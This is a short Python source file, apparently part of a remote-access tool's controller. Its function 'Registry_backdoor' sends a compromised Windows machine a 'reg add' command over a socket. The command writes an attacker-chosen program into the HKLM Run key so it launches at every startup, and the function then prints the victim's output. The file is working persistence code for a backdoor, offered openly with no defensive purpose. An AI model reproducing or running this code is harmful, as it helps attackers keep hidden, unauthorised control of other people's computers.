import struct


def Registry_backdoor(conn, choice):
    command = "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v bbb /t REG_SZ /d \"\\\"" + choice.split()[1] + "\\\" /start\" /f"
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    print('\033[1;32;32m' + "[+] Finished!" + '\033[0m')
